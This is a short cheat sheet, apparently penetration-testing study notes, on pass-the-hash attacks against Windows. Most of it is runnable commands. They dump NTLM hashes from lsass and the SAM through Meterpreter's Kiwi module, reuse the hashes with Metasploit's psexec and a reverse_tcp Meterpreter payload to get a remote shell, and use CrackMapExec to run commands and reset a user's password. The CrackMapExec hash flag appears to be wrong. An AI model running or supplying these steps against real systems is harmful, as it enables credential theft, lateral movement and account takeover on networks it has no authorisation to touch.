# Pass-The-Hash

## Explanation

- Pass-the-hash is an exploitation technique that involves capturing or harvesting NTLM hashes or clear-text passwords and utilizing them to authenticate with the target legitimately.

- We can use multiple tools to facilitate a Pass-the-hash attack :
    - Metasploit PsExec module
    - Crackmapexec

- This technique will allow us to obtain access to the target system via legitimate credentials as opposed to obtaining access via service exploitation.

## Technics

### With Metasploit framework and kiwi module

1. Migrate into lsass process : 

```text
meterpreter > migrate -N lsass.exe
```

2. Load Kiwi module on Metasploit Framework : 

```text
meterpreter > load kiwi
```

3. Dump all windows users NTLM hashes :

```text
meterpreter > lsa_dump_sam
```

4. Create a new text file, and copy/past NTLM hashes :

```text
vim hashes.txt

Administrator :
Student :
```

5. Next, copy/past LM hash of this users in the same file :

```text
meterpreter > hashdump
```

6. Ctrl+Z for quit, and use PsExec module :

```
msf6 > use exploit/windows/smb/psexec
msf6 > set payload windows/meterpreter/reverse_tcp
msf6 > set LPORT 4444
msf6 > set RHOSTS <victim-ip>
msf6 > set SMBUser Administrator
msf6 > set SMBPass <LM-hash:NTLM-hash>
msf6 > run
```

### With Crackmapexec

```
crackmapexec smb <target-ip> -u <user> -h "NTLM-hash" -x "whoami"
crackmapexec smb <target-ip> -u <user> -h "NTLM-hash" -x "net user <user> <new-password>"
```
